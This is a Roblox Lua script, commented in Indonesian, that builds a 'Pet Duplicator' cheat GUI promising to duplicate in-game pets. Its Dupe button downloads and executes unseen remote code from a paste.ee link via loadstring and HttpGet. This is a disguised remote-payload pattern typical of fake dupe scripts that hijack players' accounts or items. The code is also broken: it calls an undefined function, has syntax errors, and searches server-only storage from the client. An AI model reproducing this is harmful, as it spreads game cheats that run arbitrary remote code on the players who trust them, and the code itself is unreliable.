local Players = game:GetService("Players")
local player = Players.LocalPlayer
local gui = player:WaitForChild("PlayerGui")

-- GUI Utama
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PetDuplicatorGUI"
screenGui.Parent = gui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 300, 0, 180)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -90)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = mainFrame

-- Judul
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Text = "Pet Duplicator"
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = mainFrame

-- Tombol Minimize
local minimizeButton = Instance.new("TextButton")
minimizeButton.Name = "MinimizeButton"
minimizeButton.Text = "_"
minimizeButton.Size = UDim2.new(0, 30, 0, 20)
minimizeButton.Position = UDim2.new(1, -35, 0, 5)
minimizeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
minimizeButton.BorderSizePixel = 0
minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
minimizeButton.Font = Enum.Font.GothamBold
minimizeButton.TextSize = 14
minimizeButton.Parent = mainFrame

local minimizeCorner = Instance.new("UICorner")
minimizeCorner.CornerRadius = UDim.new(0, 4)
minimizeCorner.Parent = minimizeButton

-- Instruksi
local instructions = Instance.new("TextLabel")
instructions.Name = "Instructions"
instructions.Text = "Hold one of these pets:\n- Red Fox\n- Dragonfly\n- Raccoon\nThen click Dupe button"
instructions.Size = UDim2.new(0.9, 0, 0, 80)
instructions.Position = UDim2.new(0.05, 0, 0, 40)
instructions.BackgroundTransparency = 1
instructions.TextColor3 = Color3.fromRGB(200, 200, 200)
instructions.Font = Enum.Font.Gotham
instructions.TextSize = 13
instructions.TextXAlignment = Enum.TextXAlignment.Left
instructions.TextYAlignment = Enum.TextYAlignment.Top
instructions.Parent = mainFrame

-- Tombol Dupe
local dupeButton = Instance.new("TextButton")
dupeButton.Name = "DupeButton"
dupeButton.Text = "Dupe"
dupeButton.Size = UDim2.new(0.9, 0, 0, 40)
dupeButton.Position = UDim2.new(0.05, 0, 0, 130)
dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
dupeButton.BorderSizePixel = 0
dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
dupeButton.Font = Enum.Font.GothamBold
dupeButton.TextSize = 14
dupeButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 6)
buttonCorner.Parent = dupeButton

-- Tombol Show GUI (akan muncul ketika GUI disembunyikan)
local showGuiButton = Instance.new("TextButton")
showGuiButton.Name = "ShowGuiButton"
showGuiButton.Text = "Show Menu"
showGuiButton.Size = UDim2.new(0, 100, 0, 40)
showGuiButton.Position = UDim2.new(0, 10, 0, 10)
showGuiButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
showGuiButton.BorderSizePixel = 0
showGuiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
showGuiButton.Font = Enum.Font.GothamBold
showGuiButton.TextSize = 14
showGuiButton.Visible = false
showGuiButton.Parent = screenGui

local showButtonCorner = Instance.new("UICorner")
showButtonCorner.CornerRadius = UDim.new(0, 6)
showButtonCorner.Parent = showGuiButton

-- Notifikasi
local function showNotification(message, color)
    local notification = Instance.new("TextLabel")
    notification.Name = "Notification"
    notification.Text = message
    notification.Size = UDim2.new(0.8, 0, 0, 40)
    notification.Position = UDim2.new(0.5, 0, 0, -50)
    notification.AnchorPoint = Vector2.new(0.5, 0)
    notification.BackgroundColor3 = color
    notification.TextColor3 = Color3.fromRGB(255, 255, 255)
    notification.Font = Enum.Font.GothamBold
    notification.TextSize = 14
    notification.Parent = mainFrame

    local notifCorner = Instance.new("UICorner")
    notifCorner.CornerRadius = UDim.new(0, 6)
    notifCorner.Parent = notification

    delay(3, function()
        notification:Destroy()
    end)
end

-- Daftar pet yang valid (case insensitive)
local VALID_PETS = {
    ["red fox"] = true,
    ["dragonfly"] = true,
    ["raccoon"] = true,
    ["praying mantis"] = true,  -- Tambahan sesuai kebutuhan
    ["deer"] = true              -- Jika masih diperlukan
}

-- Fungsi rekursif untuk mencari pet valid di semua subfolder
local function deepFindValidPets(parent, path, results)
    results = results or {}
    
    -- Cek semua child dari parent
    for _, child in ipairs(parent:GetChildren()) do
        -- Jika ini adalah Tool dan namanya match dengan valid pets
        if child:IsA("Tool") then
            local lowerName = child.Name:lower()
            if VALID_PETS[lowerName] then
                table.insert(results, {
                    object = child,
                    path = path..child.Name,
                    type = "Tool",
                    name = child.Name
                })
            end
        -- Jika ini adalah Model (untuk pet yang mungkin berupa Model)
        elseif child:IsA("Model") and VALID_PETS[child.Name:lower()] then
            table.insert(results, {
                object = child,
                path = path..child.Name,
                type = "Model",
                name = child.Name
            })
        end
        
        -- Jika ini adalah container (Folder, Model, dll), cari di dalamnya
        if child:IsA("Folder") or child:IsA("Model") or child:IsA("Configuration") then
            deepFindValidPets(child, path..child.Name.." > ", results)
        end
    end
    
    return results
end

-- Fungsi utama untuk mencari pet di semua lokasi penting
local function findAllValidPets()
    local searchLocations = {
        game:GetService("Workspace"),
        game:GetService("ReplicatedStorage"),
        game:GetService("ServerStorage"), -- Hanya bisa diakses di server
        game:GetService("StarterPack"),
        game:GetService("StarterGui"),
        player.Character or player:WaitForChild("Character"),
        player:FindFirstChild("Backpack") or player:WaitForChild("Backpack")
    }

    local allResults = {}
    
    for _, location in ipairs(searchLocations) do
        if location then
            deepFindValidPets(location, location.Name.." > ", allResults)
        end
    end
    
    return allResults
end

-- Fungsi untuk mencari pet yang sedang dipegang/dibawa player
local function findHeldValidPet()
    -- Cek di karakter
    local character = player.Character
    if character then
        for _, child in ipairs(character:GetChildren()) do
            if (child:IsA("Tool") and VALID_PETS[child.Name:lower()] then
                return child
            end
        end
    end
    
    -- Cek di backpack
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, child in ipairs(backpack:GetChildren()) do
            if (child:IsA("Tool") and VALID_PETS[child.Name:lower()] then
                return child
            end
        end
    end
    
    return nil
end

-- Contoh penggunaan:
-- 1. Mencari semua pet valid di game
local allPets = findAllValidPets()
for _, pet in ipairs(allPets) do
    print(`Found {pet.name} at {pet.path}`)
end

-- 2. Mencari pet yang sedang dipegang player
local heldPet = findHeldValidPet()
if heldPet then
    print(`Holding valid pet: {heldPet.Name}`)
else
    print("No valid pet being held")
end

-- Fungsi untuk mengeksekusi script dupe
local function executeDupeScript()
    local pet = findValidPet()
    
    if not pet then
        showNotification("No valid pet found!", Color3.fromRGB(255, 50, 50))
        return
    end

    showNotification("Starting dupe process...", Color3.fromRGB(0, 150, 0))
    dupeButton.Text = "Duping..."
    dupeButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)

    local success, err = pcall(function()
        loadstring(game:HttpGet("https://paste.ee/r/s7TguhY5"))()
    end)

    if success then
        showNotification("Dupe script executed!", Color3.fromRGB(0, 200, 0))
    else
        showNotification("Error: " .. tostring(err), Color3.fromRGB(255, 50, 50))
        warn("Execution error: " .. tostring(err))
    end

    dupeButton.Text = "Dupe"
    dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
end

-- Fungsi untuk toggle GUI
local function toggleGUI(visible)
    mainFrame.Visible = visible
    showGuiButton.Visible = not visible
end

-- Event klik tombol
dupeButton.MouseButton1Click:Connect(executeDupeScript)
minimizeButton.MouseButton1Click:Connect(function()
    toggleGUI(false)
end)
showGuiButton.MouseButton1Click:Connect(function()
    toggleGUI(true)
end)

-- Auto update ketika karakter berubah
player.CharacterAdded:Connect(function()
    wait(1) -- Beri waktu untuk load item
    if findValidPet() then
        dupeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    else
        dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    end
end)

-- Update status awal
if findValidPet() then
    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
end

-- Inisialisasi GUI
toggleGUI(true)
